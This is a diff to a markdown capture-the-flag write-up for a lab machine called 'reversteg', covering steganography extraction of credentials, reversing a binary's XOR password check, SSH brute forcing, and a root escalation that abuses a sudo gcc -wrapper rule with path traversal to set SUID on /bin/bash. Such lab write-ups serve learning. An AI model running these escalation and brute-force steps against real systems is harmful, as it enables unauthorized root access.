@@ -45,31 +45,31 @@ so lets go to see what web application running on port 80
 i did some addition enumeration with nikto and gobuster but i found that some directories is just redirect to the default page of apache2
 
 after reading the source code of the default page i found some comment :
-
+```text
 	
         " role="button" style="color:#f6f6f4;display:none" tabindex="0">```
           It works!
         div>
 	
         div class="content_section_text">
-```text
+```
 
 And another clue:
 
+```text
+<!-- Some people always don't understand the format of photos. -->
 ```
-
-```bash
 The string "117db0148dc179a2c2245c5a30e63ab0" appears to be a reference to an image file. Based on the hint about "format of photos," I tried accessing this string with various image extensions:
 
-```
+```bash
 wget http://192.168.56.104/117db0148dc179a2c2245c5a30e63ab0.jpg
 wget http://192.168.56.104/117db0148dc179a2c2245c5a30e63ab0.png
-```bash
+```
 ## Steganography
 
 so using strings on both images i found that there is some interisting printable strings
 
-```
+```bash
 $ strings 117db0148dc179a2c2245c5a30e63ab0.jpg
 
 B219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
@@ -77,10 +77,10 @@ B219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
 ..
 TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5
 
-```bash
+```
 just the decode give us some hints , so after looking on the internet i found that there is a tool that also extract some hidden information about the PNG images named zsteg so we gonna use it and hope something show up :
 
-```
+```bash
 $ zsteg 117db0148dc179a2c2245c5a30e63ab0.png 
 imagedata           .. text: "\n\n\n\t\t\t\n\n\n"
 b1,rgb,lsb,xy       .. text: "morainelake"
@@ -98,10 +98,10 @@ b4,g,lsb,xy         .. text: ["\"" repeated 10 times]
 b4,g,msb,xy         .. text: "HDDDDDDDDDDH"
 b4,b,lsb,xy         .. text: "3\"##2\"\"#33333333333333334DDDDDDDDDD4C333\"\"\""
 b4,b,msb,xy         .. text: ",\"\"\"\"\"\"\"\"\"\","
-```bash
+```
 we have some text in the output we gonna try it , in the first attempt i found that the password to extract some more information with steghide is "morainelake"
 
-```
+```bash
 $ steghide --extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p "morainelake"
 wrote extracted data to "secret.zip".
 
@@ -113,7 +113,7 @@ extracting: secret/secret.txt
 
 $ cat secret/secret.txt
 morainelake:660930334
-```bash
+```
 So, we obtained credentials to log in via SSH. After reading `note.txt`, we found that the history contains 48 potential flags. Since I have no idea how to identify the correct flag, I decided to use Burp Suite Intruder to try each flag one by one. Using Burp Suite, I discovered that the correct flag is `flag{f8xxxxxx}`.Next, I used `linpeas.sh` to check for vulnerabilities on the machine or anything interesting that could help me escalate privileges to root. After running the script, I found the following:
 
 - Another user named "welcome"
@@ -123,7 +123,7 @@ So, we obtained credentials to log in via SSH. After reading `note.txt`, we foun
 
 I analyzed the binary using Ghidra (u can use IDA pro)to understand its functionality. The decompiled code revealed:
 
-```
+```c
 
 undefined8 main(void)
 
@@ -204,7 +204,7 @@ LAB_0010144d:
   free(local_30);
   return 0;
 }
-```bash
+```
 so using the hint provided on the code we can see that we need to encrypt using xor
 
 - local\_c3 = 0x38202c2f
@@ -232,10 +232,10 @@ Example: The hex value `0x12345678` is stored in memory as `78 56 34 12`.
 
 In the decompiled code, variables like `local_cc` stored hex values in little-endian format:
 
-```
+```text
 Original (hex): 7a 7b 78 79 7d 7c 21 21  
 Little-endian bytes: 21 21 7c 7d 79 78 7b 7a
-```bash
+```
 **XOR in Cryptography**
 
 - **Encryption**: `Plaintext ⊕ Key = Ciphertext`
@@ -246,7 +246,7 @@ Little-endian bytes: 21 21 7c 7d 79 78 7b 7a
 The variable `local_d` in the decompiled code was set to `'M'` (ASCII `0x4D`):  
 **Apply XOR to Little-Endian Bytes**
 
-```
+```text
 0x21 ^ 0x4D = 0x6C (ASCII 'l')
 0x21 ^ 0x4D = 0x6C (ASCII 'l')
 0x7C ^ 0x4D = 0x31 (ASCII '1')
@@ -256,15 +256,15 @@ The variable `local_d` in the decompiled code was set to `'M'` (ASCII `0x4D`):
 0x7B ^ 0x4D = 0x36 (ASCII '6')
 0x7A ^ 0x4D = 0x37 (ASCII '7')
 ll104567
-```text
+```
 Applying the same process to the other variables, I determined the complete input required was:
 
-```
+```bash
 Enter passwords or Enter H coward mode:
 ll104567
 bamuwe ta0 eviden
 [+] Enter the password successfully! you know: flower
-```bash
+```
 
 so i was confused where is the password so to avoid that i create a list that have these words and i brute force the ssh port and i found that the password is "**ll104567bamuweta0eviden**"
 
@@ -272,7 +272,7 @@ so i was confused where is the password so to avoid that i create a list that ha
 
 we are success to authenticate with welcome
 
-```
+```bash
 bash-5.0$ whoami
 welcome
 bash-5.0$ sudo -l
@@ -282,37 +282,37 @@ Matching Defaults entries for welcome on reversteg:
 
 User welcome may run the following commands on reversteg:
     (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
-```bash
+```
 The sudo rule allows running `/usr/bin/gcc` with the `-wrapper` flag pointing to anything in `/opt/*`. This can be exploited through path traversal.
 
 Created a malicious script to set the SUID bit on `/bin/bash`:
 
-```
+```bash
 echo '#!/bin/bash' > /tmp/exploit.sh
 echo 'chmod +s /bin/bash' >> /tmp/exploit.sh
 chmod +x /tmp/exploit.sh
-```bash
-
 ```
+
+```bash
 bash-5.0$ cat exploit.sh 
 #!/bin/bash
 chmod +s /bin/bash
-```bash
+```
 so after looking how the /usr/bin/gcc works i found :  
 The `-wrapper` flag in GCC allows executing a program during compilation:
 
-```
-gcc -wrapper , 
 ```bash
+gcc -wrapper , 
+```
 Exploited the wildcard by using path traversal to point to our script:
 
-```
+```bash
 bash-5.0$ sudo /usr/bin/gcc -wrapper /opt/../../tmp/exploit.sh . 
 # or u can directly use this one without create a file exploit.sh
 bash-5.0$ /bin/bash -p
 bash-5.0# whoami
 root
-```text
+```
 so u can read the flag
 
 ## Key takeaway:
@@ -324,5 +324,3 @@ so u can read the flag
 ## MY POV
 
 This was my first experience with reverse engineering, and I found it incredibly rewarding. Reading the decompiled code and understanding how the program actually worked was challenging but fascinating. Though it was tough at times, the learning process was enjoyable and extremely valuable. I gained significant insights into binary analysis .
-
-```
